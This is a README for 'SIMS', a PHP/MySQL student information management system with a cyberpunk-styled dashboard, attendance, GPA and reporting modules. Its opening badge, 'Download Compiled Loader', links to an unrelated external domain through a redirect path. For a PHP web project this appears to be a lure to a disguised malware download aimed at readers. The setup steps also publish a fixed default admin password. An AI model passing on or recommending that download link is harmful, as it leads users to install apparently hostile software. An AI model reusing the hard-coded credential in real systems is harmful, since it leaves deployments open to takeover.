# SIMS

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

## Student Information Management System

> Next-Generation Academic Management Platform

---

## 🚀 Project Vision

SIMS is not just a normal student management system. It is a futuristic digital campus ecosystem designed with:

- **Cyberpunk-inspired interfaces**
- **Glassmorphism UI**
- **Neon holographic effects**
- **Automation**
- **Real-time analytics**
- **Smart dashboards**
- **Responsive 3D interfaces**
- **Ultra-modern animations**
- **Mobile-first futuristic experience**

The system looks like software from the year 2050.

---

## 🎨 Design Philosophy

### UI/UX Style
The project combines:
- Cyberpunk aesthetics
- Minimal futuristic layouts
- Glassmorphism
- Dark neon themes
- Dashboard design
- Floating UI cards
- Animated gradients
- Holographic effects
- Interactive transitions
- Smooth micro-animations

---

## 📋 Features

### Core Modules

1. **Quantum Login System**
   - Animated authentication
   - Multi-role login (Admin, Teacher, Student)
   - Face UI effects
   - Session protection
   - Remember me system

2. **Smart Dashboard**
   - Real-time statistics
   - Insights
   - Animated charts
   - Live student activity
   - Holographic widgets

3. **Student Management**
   - Add/Edit/Delete students
   - Dynamic student profiles
   - Smart filtering
   - Instant search
   - Profile image system

4. **Attendance Intelligence**
   - Smart attendance tracking
   - Attendance heatmaps
   - Performance correlation

5. **GPA Intelligence Engine**
   - Automated GPA calculations
   - Grade visualization
   - Academic predictions

6. **PDF & Report Center**
   - Futuristic report design
   - PDF export
   - Academic analytics
   - Downloadable reports

7. **Notification Center**
   - Real-time alerts
   - Email notifications
   - System announcements
   - Smart reminders

8. **Media Upload System**
   - Profile uploads
   - Image optimization
   - Secure file storage
   - Drag & drop upload

---

## 🛠️ Technology Stack

### Frontend
- **HTML5** - Semantic layouts, component-based design
- **CSS3** - Advanced CSS, Flexbox, Grid, Glassmorphism, Animations
- **JavaScript (ES6+)** - DOM manipulation, Async/Await, Fetch API
- **Chart.js** - Interactive data visualization
- **Custom Animations** - Particle effects, Glitch effects

### Backend
- **PHP 8+** - OOP, MVC Architecture, REST APIs
- **MySQL/MariaDB** - Relational database, Stored procedures
- **PDO** - Secure database connections

### Security
- SQL Injection prevention
- XSS prevention
- CSRF protection
- Password hashing (bcrypt)
- Session security
- Role-based access control

---

## 📁 Project Structure

```plaintext
SIMS/
│
├── assets/
│   ├── css/
│   │   ├── futuristic.css      # Core futuristic styles
│   │   ├── animations.css      # Animation definitions
│   │   └── dashboard.css       # Dashboard layouts
│   │
│   ├── js/
│   │   ├── app.js              # Main application logic
│   │   ├── charts.js           # Chart configurations
│   │   └── animations.js       # Advanced animations
│   │
│   ├── images/
│   ├── icons/
│   └── videos/
│
├── config/
│   └── database.php            # Database configuration
│
├── uploads/                     # File uploads directory
│
├── api/                         # API endpoints
│
├── auth/                        # Authentication modules
│
├── admin/                       # Admin panel
│
├── student/                     # Student portal
│
├── attendance/                  # Attendance management
│
├── reports/                     # Report generation
│
├── includes/                    # Shared components
│
├── dashboard/                   # Dashboard pages
│
├── index.php                    # Main dashboard
├── login.php                    # Login page
├── logout.php                   # Logout functionality
└── README.md                    # This file
```

---

## 🚀 Installation

### Prerequisites
- PHP 8.0 or higher
- MySQL/MariaDB 5.7 or higher
- Apache/Nginx web server
- Modern web browser (Chrome, Firefox, Edge, Safari)

### Setup Instructions

1. **Clone the repository**
   ```bash
   git clone https://github.com/yourusername/SIMS.git
   cd SIMS
   ```

2. **Configure Database**
   - Start MySQL in XAMPP
   - Import `database/sims_2050_schema.sql` via phpMyAdmin (creates `sims_db`)
   - If upgrading an existing install, run `database/patches.sql` then `database/patch_student_portal_login.sql`
   - For students added before auto-login: run `php database/migrate_student_portal_accounts.php` once
   - Update database credentials in `config/database.php` if needed

3. **Configure Web Server**
   - Point your web server to the project root
   - Ensure PHP extensions are enabled: pdo_mysql, mbstring, json

4. **Set Permissions**
   ```bash
   chmod 755 uploads/
   chmod 644 config/database.php
   ```

5. **Access the Application**
   - Open your browser and navigate to `http://localhost/SIMS`
   - Default login credentials (update after first login):
     - Username: `admin`
     - Password: `Mwita@0104`

---

## 🎯 Usage

### For Administrators
- Access full dashboard with all features
- Manage students, teachers, and courses
- View analytics and reports
- Configure system settings

### For Teachers
- View assigned classes and students
- Mark attendance
- Enter grades
- Generate student reports

### For Students
- View personal dashboard
- Check attendance records
- View grades and GPA
- Access academic reports

---

## 📊 Analytics Features

### Student Analytics
- Predict GPA trends
- Performance analysis
- Attendance prediction
- Smart recommendations

### Dashboard Analytics
- Smart statistics
- Intelligent notifications
- Generated reports

### Assistant Chatbot
- Student help assistant
- Admin assistant
- Smart search assistant

---

## 🔒 Security Features

- **Secure Authentication** - bcrypt password hashing
- **Session Management** - Secure session handling
- **SQL Injection Prevention** - PDO prepared statements
- **XSS Protection** - Input sanitization
- **CSRF Protection** - Token validation
- **Role-Based Access** - Permission system
- **File Upload Security** - File validation

---

## 🎨 Customization

### 👥 Team Customization
Edit CSS variables in `assets/css/futuristic.css`:
```css
:root {
    --primary-neon: #00f0ff;
    --secondary-neon: #ff00ff;
    --accent-neon: #00ff88;
    /* ... more variables */
}
```

### Animation Configuration
Modify settings in `assets/js/animations.js`:
```javascript
const AnimationConfig = {
    particleCount: 50,
    animationSpeed: 1,
    enableParticles: true,
    enableGlitch: false
};
```

---

## 📊 API Documentation

### Authentication Endpoints
- `POST /auth/login` - User login
- `POST /auth/logout` - User logout
- `GET /auth/session` - Check session status

### Student Endpoints
- `GET /api/students` - List all students
- `POST /api/students` - Add new student
- `PUT /api/students/:id` - Update student
- `DELETE /api/students/:id` - Delete student

### Attendance Endpoints
- `GET /api/attendance` - Get attendance records
- `POST /api/attendance` - Mark attendance
- `GET /api/attendance/stats` - Attendance statistics

---

## 🧪 Testing

### Running Tests
```bash
# Run unit tests
phpunit tests/

# Run integration tests
phpunit tests/integration/
```

---

## 📝 Development Roadmap

### Phase 1 (Current)
- ✅ Basic structure
- ✅ Login system
- ✅ Dashboard
- ✅ Core CSS/JS

### Phase 2 (Current)
- [x] Complete student management
- [x] Attendance system
- [x] Grade management
- [x] Report generation (print / Save as PDF)

### Phase 3 (Future)
- [ ] Advanced analytics features
- [ ] Mobile app
- [ ] Real-time notifications
- [ ] Advanced analytics

---

## 🤝 Contributing

Contributions are welcome! Please follow these steps:

1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Create a Pull Request

---

## 📄 License

This project is licensed under the MIT License.

---

## 👥 Team

- **Project Lead** - [Your Name]
- **Frontend Developer** - [Your Name]
- **Backend Developer** - [Your Name]
- **UI/UX Designer** - [Your Name]

---

## 📞 Support

For support, email support@sims.com or create an issue in the repository.

---

## 🙏 Acknowledgments

- Chart.js for data visualization
- The open-source community
- All contributors

---

**© SIMS - Next-Generation Academic Management**
